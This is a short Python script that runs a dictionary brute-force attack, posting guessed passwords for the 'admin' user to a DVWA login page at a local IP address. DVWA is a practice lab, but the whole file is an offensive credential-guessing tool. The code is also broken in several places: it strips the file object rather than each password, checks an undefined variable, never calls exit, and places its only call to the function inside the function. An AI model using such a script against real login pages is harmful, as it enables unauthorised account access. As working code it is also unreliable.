import requests
url ="https://192.168.1.9/dvwa/login.php"
username = "admin"
passwords = open("D:\Projects\dictionary-PassList.txt" , "r")

def bruteforce(usernam,url):
    for password in passwords:
        password = passwords.strip()
        print("[!!] trying to bruteforce password " + password)
        data_dictionary = {'username':username , 'password' : password ,'login':'submit'}
        response=requests.post(url,data=data_dictionary)
        if "login faild" in str(resp.content): # type: ignore
            pass
        else:
            print("[+] username is :" + username)
            print("[+] Password is :" + password)
            exit


    bruteforce(username, url)
